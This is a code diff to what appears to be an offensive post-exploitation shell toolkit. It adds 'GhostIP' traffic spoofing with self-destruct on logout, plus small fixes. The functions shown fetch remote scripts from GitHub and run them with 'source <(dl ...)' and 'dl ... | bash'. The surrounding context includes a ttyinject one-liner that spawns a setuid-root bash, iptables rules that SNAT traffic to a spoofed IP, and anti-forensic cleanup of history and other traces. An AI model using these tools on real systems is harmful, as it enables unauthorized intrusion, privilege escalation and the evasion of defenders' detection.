@@ -78,7 +78,7 @@ HS_INFO() { echo -e >&2 "${CDG}INFO: ${CDM}$*${CN}"; }
 _hs_internet_allowed() {
     [ -n "$_HS_INTERNET_ALLOWED" ] && return
 
-    HS_ERR "Internet access required. Type ${CDC}xint${CDR} to allow."
+    HS_ERR "Internet access is required. Type ${CDC}xint${CDR} to allow."
     return 255
 }
 
@@ -599,7 +599,7 @@ ghostdev() {
     local in="${1}"
     local ghostip="${2}"
     local out="${3}"
-    [ -z "$out" ] && { echo >&2 "Usage: ghost <in-interface> <ghost-ip> <out-interface>"; return 255; }
+    [ -z "$out" ] && { echo >&2 "Usage: ghostdev <in-interface> <ghost-ip> <out-interface>"; return 255; }
     # Mark all packets arriving from the wg interface (so that we can later SNAT them to a ghost IP).
     iptables -t mangle -D PREROUTING -i "${in:?}" -j MARK --set-mark 0x8011 2>/dev/null
     iptables -t mangle -A PREROUTING -i "${in:?}" -j MARK --set-mark 0x8011
@@ -634,7 +634,12 @@ unghostdev() {
 }
 
 ghostip() {
-    source <(dl https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
+    # if [ -s "ghostip.sh" ]; then
+    #     source "ghostip.sh"
+    # else
+        source <(dl https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
+    # fi
+    [ -n "$_GHOST_IS_UP" ] && HS_WARN "GhostIP will ${CR}AUTO DESTRUCT${CDM} on exit. Type ${CDC}xghost${CDM} for it to remain."
 }
 
 ltr() {
@@ -753,7 +758,7 @@ _hs_enc_init() {
 # enc         - Encrypt stdin
 enc() {
     local data
-    declare -f _hs_dep >/dev/null && _hs_dep openssl
+    declare -F _hs_dep >/dev/null && _hs_dep openssl
 
     # Return true if not yet marked as once.
     # _once <key>
@@ -784,7 +789,7 @@ enc() {
 
 dec() {
     local data
-    declare -f _hs_dep >/dev/null && _hs_dep openssl
+    declare -F _hs_dep >/dev/null && _hs_dep openssl
 
     _hs_enc_init
     [ $# -eq 0 ] && {
@@ -1896,7 +1901,7 @@ lootlight() {
         _warn_upx_exe
         _warn_skids
     }
-    declare -f _extended_history >/dev/null && [ -n "$PROMPT_COMMAND" ] && {
+    declare -F _extended_history >/dev/null && [ -n "$PROMPT_COMMAND" ] && {
         unset PROMPT_COMMAND
         echo -e "${CR}Extended bash-history was enabled. Check ~/.bash_extended_history${CN}"
     }
@@ -2220,7 +2225,6 @@ lpe() {
 }
 
 ws() {
-    # dl https://thc.org/ws | bash
     dl 'https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/whatserver.sh' | bash
 }
 
@@ -2356,6 +2360,22 @@ ttyinject() {
   ${CDC}"'/var/tmp/.socket -p -c "exec python3 -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
 }
 
+unghost() {
+    declare -F ghostip_destruct >/dev/null && ghostip_destruct
+    unghostdev
+}
+
+xghost() {
+    [ -z "$_HS_GHOST_REMAIN" ] && {
+        _HS_GHOST_REMAIN=1
+        HS_INFO "GhostIP will ${CDG}REMAIN${CDM} after logout."
+        return
+    }
+
+    unset _HS_GHOST_REMAIN
+    HS_INFO "GhostIP will ${CDR}DESTRUCT${CDM} on logout."
+}
+
 hs_exit() {
     cd /tmp || cd /dev/shm || cd /
     [ -n "$_is_hs_bounceinit" ] && HS_WARN "Bounce still set. Type ${CDC}unbounce${CN} to stop the forward."
@@ -2370,6 +2390,13 @@ hs_exit() {
             rmdir "${XHOME}/.run" 2>/dev/null && _hs_destruct
         fi
     }
+    if [ -n "$_HS_GHOST_REMAIN" ]; then
+        HS_WARN "GhostIP is still set. Type ${CDC}unghost${CDM} to destruct."
+    else
+        unghost
+        HS_WARN "GhostIP has now been ${CR}DESTRUCTED${CDM}. Type ${CDC}xghost${CDM} to prevent this in the future."
+    fi
+
     [ -z "$QUIET" ] && [ -t 1 ] && echo -e "${CW}>>>>> 📖 More tips at https://thc.org/tips${CN} 😘"
     kill -9 $$
 }
@@ -2520,7 +2547,7 @@ ipf() {
 cn() {
     local str
     local x509
-    declare -f _hs_dep >/dev/null && {
+    declare -F _hs_dep >/dev/null && {
         _hs_dep openssl || return
         _hs_dep sed || return
     }
@@ -2617,8 +2644,9 @@ hs_init_alias() {
 }
 
 _hs_init_ghost() {
-    [ -n "${_HS_CG_GHOST}" ] && [ "${_HS_CG_GHOST}" != "NA" ] && return 0
-    [ "${_HS_CG_GHOST}" = "NA" ] && return 255
+    # [ -n "${_HS_CG_GHOST}" ] && [ "${_HS_CG_GHOST}" != "NA" ] && return 0
+    # [ "${_HS_CG_GHOST}" = "NA" ] && return 255
+    [ -n "${_HS_CG_GHOST}" ] && return 0
 
     local cg_root="/sys/fs/cgroup"
     # Check for cgroup v2
@@ -2636,13 +2664,13 @@ _hs_init_ghost() {
     return 255
 }
 
+# Add an PID to a cgroup.
 ghost() {
     _hs_init_ghost || return
     [ -z "${_HS_CG_GHOST}" ] && return
     [ -z "${1}" ] && { echo -e "PIDs using GhostIP:\n$(cat "${_HS_CG_GHOST}")"; return; }
     echo "${1:?}" >"${_HS_CG_GHOST}"
 }
-
 
 hs_init_shell() {
     unset LC_TERMINAL LC_TERMINAL_VERSION
@@ -2808,8 +2836,6 @@ hs_info
     }
     export _HS_HUSH=1
 }
-
-
 
 # unset all functions that are no longer needed.
 unset -f hs_init hs_init_alias hs_init_dl hs_init_shell
